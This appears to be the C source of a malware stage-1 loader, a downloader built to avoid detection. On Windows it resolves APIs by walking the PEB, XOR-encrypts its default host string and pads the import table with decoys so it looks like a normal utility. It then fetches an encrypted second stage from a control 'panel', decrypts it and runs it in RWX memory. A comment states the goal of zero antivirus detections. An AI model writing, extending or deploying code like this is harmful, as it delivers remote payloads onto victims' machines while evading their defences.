/*
 * Stage 1 entry point.
 *
 * Windows: `stage1_entry` is the linker entry (no CRT, no argv). It
 *   resolves the Win32 API table via PEB walk, fetches the encrypted
 *   stage2 from the panel, XOR-decrypts, runs it in RWX memory, and
 *   terminates via the resolved ExitProcess — IAT stays at one import.
 *
 * Linux: `main()` is the standard CRT entry. No PEB equivalent; plain
 *   glibc. The Linux build is for development iteration only (0/72 goal
 *   applies to the Windows PE).
 */

#include "config.h"
#include "xor.h"
#include "http.h"
#include "mem_exec.h"

#ifdef _WIN32
#  include "api_table.h"
#  include "xor_string.h"
#  include "decoys.h"
#else
#  include <stdlib.h>
#endif

/*
 * Default config. The builder tool overwrites this blob post-build;
 * values here are for in-repo development iteration only. stage2_host
 * is intentionally empty — on Windows, stage1_entry decodes an
 * XS-encrypted loopback default when the field is blank.
 */
stage1_config_t g_config = {
    .magic = STAGE1_MAGIC,
    .flags = 0,
    .stage2_port = 8080,
    .stage_number = 2,
    .xor_key = {0x41, 0x42, 0x43, 0x44},
    .xor_key_len = 4,
    .reserved = {0},
    .stage2_host = {0}
};

#ifdef _WIN32

/* "127.0.0.1" — XS-encrypted default host for the dev build. */
static volatile const unsigned char k_default_host_enc[] = {
    XE('1', 0), XE('2', 1), XE('7', 2), XE('.', 3),
    XE('0', 4), XE('.', 5), XE('0', 6), XE('.', 7),
    XE('1', 8), XE( 0 , 9)
};

static void wipe_bytes(volatile void *p, size_t n) {
    volatile unsigned char *b = (volatile unsigned char *)p;
    for (size_t i = 0; i < n; i++) b[i] = 0;
}

void __attribute__((noreturn)) stage1_entry(void)
{
    uint8_t *payload = 0;
    size_t   payload_len = 0;
    int      rc = 1;
    char     host_buf[sizeof(k_default_host_enc)];

    /* IAT-shape decoys — populates the import table with kernel32
     * entries so the PE silhouette matches a normal small utility.
     * Behaviour-neutral; result is sunk into a volatile. */
    static volatile uint32_t decoy_sink;
    decoy_sink ^= decoys_run();

    if (resolve_apis() != 0) goto done;
    if (!config_valid(&g_config)) goto done;

    const char *host = g_config.stage2_host;
    if (host[0] == 0) {
        xs_decode(k_default_host_enc, host_buf, sizeof(host_buf));
        host = host_buf;
    }

    int hr = http_fetch_stage(host, g_config.stage2_port,
                              g_config.stage_number,
                              &payload, &payload_len);
    wipe_bytes(host_buf, sizeof(host_buf));
    if (hr != HTTP_OK || !payload || payload_len == 0) goto done;

    xor_decrypt(payload, payload_len,
                g_config.xor_key, g_config.xor_key_len);

    rc = mem_run(payload, payload_len);

done:
    if (payload && g_api.VirtualFree) {
        wipe_bytes(payload, payload_len);
        g_api.VirtualFree(payload, 0, 0x8000 /* MEM_RELEASE */);
    }
    if (g_api.ExitProcess) g_api.ExitProcess((UINT)rc);
    for (;;) { } /* unreachable — silences [[noreturn]] */
}

#else /* Linux */

int main(void)
{
    uint8_t *payload = 0;
    size_t   payload_len = 0;
    int      rc = 1;

    if (!config_valid(&g_config)) return 1;

    int hr = http_fetch_stage(g_config.stage2_host, g_config.stage2_port,
                              g_config.stage_number,
                              &payload, &payload_len);
    if (hr != HTTP_OK || !payload || payload_len == 0) goto cleanup;

    xor_decrypt(payload, payload_len,
                g_config.xor_key, g_config.xor_key_len);

    rc = mem_run(payload, payload_len);

cleanup:
    if (payload) {
        for (size_t i = 0; i < payload_len; i++) payload[i] = 0;
        free(payload);
    }
    return rc;
}

#endif
